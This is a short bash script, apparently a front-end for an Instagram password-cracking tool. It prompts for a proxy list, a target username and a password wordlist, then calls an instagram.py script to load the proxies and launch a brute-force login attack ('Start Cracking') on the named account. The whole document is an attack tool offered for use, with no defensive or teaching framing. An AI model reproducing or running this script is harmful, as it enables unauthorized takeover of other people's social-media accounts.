# Coded By Z 
#!/bin/bash
clear
read -p "Enter Proxy List >" proxy

clear


read -p "Enter Target username >" username



read -p "Enter password wordlist >" pass

clear

# Upload Proxy
figlet Proxy
python instagram.py -px $proxy

sleep 4s

clear
# Start Brute Force
figlet BruteForce
echo "[+]Start Cracking"
sleep 3s

python instagram.py -u $username -p $pass 


